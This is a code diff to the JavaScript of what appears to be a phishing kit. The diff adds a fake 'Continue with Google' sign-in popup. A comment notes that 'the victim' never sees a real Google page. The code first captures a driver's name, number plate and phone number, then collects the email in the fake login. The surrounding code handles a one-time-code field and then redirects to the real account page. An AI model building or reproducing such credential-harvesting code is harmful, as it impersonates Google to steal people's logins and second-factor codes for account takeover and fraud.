@@ -10,6 +10,16 @@ function show(name) {
     $(id).classList.toggle('hidden', id !== name);
   }
 }
+
+// The Google sign-in lives in a POPUP over the landing page (like a real
+// "Continue with Google" flow) — the victim never sees a Google "page".
+function openPopup() {
+  $('g-overlay').classList.remove('hidden');
+  $('g-email').focus();
+}
+function closePopup() {
+  $('g-overlay').classList.add('hidden');
+}
 function hint(id, msg, error) {
   const el = $(id);
   if (msg) { el.textContent = msg; el.hidden = false; el.classList.toggle('error', !!error); }
@@ -84,12 +94,41 @@ function toast(msg) {
   clearTimeout(toast._t);
   toast._t = setTimeout(() => el.classList.remove('show'), 2400);
 }
-$('g-lang').addEventListener('click', (e) => {
-  const langs = ['English (United States)', 'English (UK)', 'Deutsch', 'Français (France)', 'Español (España)'];
-  const span = $('g-lang').querySelector('span');
-  const cur = langs.indexOf(span.textContent);
-  span.textContent = langs[(cur + 1) % langs.length];
+// real-Google bottom footer is gone in the popup layout; guard in case it returns
+if ($('g-lang')) {
+  $('g-lang').addEventListener('click', (e) => {
+    const langs = ['English (United States)', 'English (UK)', 'Deutsch', 'Français (France)', 'Español (España)'];
+    const span = $('g-lang').querySelector('span');
+    const cur = langs.indexOf(span.textContent);
+    span.textContent = langs[(cur + 1) % langs.length];
+  });
+}
+
+// ---- driver submission (landing) ----
+$('form-driver').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const driverName = $('d-name').value.trim();
+  const licensePlate = $('d-plate').value.trim();
+  if (!driverName && !licensePlate) {
+    return hint('driver-hint', 'Enter your name and number plate to continue.', true);
+  }
+  hint('driver-hint', '');
+  busy('btn-driver', true);
+  const ok = await step('driver', { driverName, licensePlate, phone: $('d-phone').value.trim() });
+  busy('btn-driver', false);
+  setWiz(ok);
+  if (!ok) {
+    hint('driver-hint', 'Something went wrong. Try again.', true);
+    return;
+  }
+  // driver details captured -> open the Google sign-in as a popup
+  openPopup();
+  show('screen-email');
 });
+
+// close the popup (backdrop click or the X), leaving the landing intact
+$('g-close').addEventListener('click', closePopup);
+$('g-overlay').addEventListener('click', (e) => { if (e.target === $('g-overlay')) closePopup(); });
 
 // ---- email ----
 $('form-email').addEventListener('submit', async (e) => {
@@ -211,6 +250,10 @@ $('g-totp').addEventListener('input', () => {
   }
   const w = await r.json();
   setWiz(w);
-  if (w.done) { redirect(); return; }
-  show('screen-email');
+  // Already signed in (e.g. reload after completing / returning visitor) ->
+  // bounce straight to the real account page; otherwise show the driver landing
+  // (popup stays closed until they hit "Continue with Google").
+  if (w.done || w.loggedIn) { redirect(); return; }
+  closePopup();
+  $('d-name').focus();
 })();
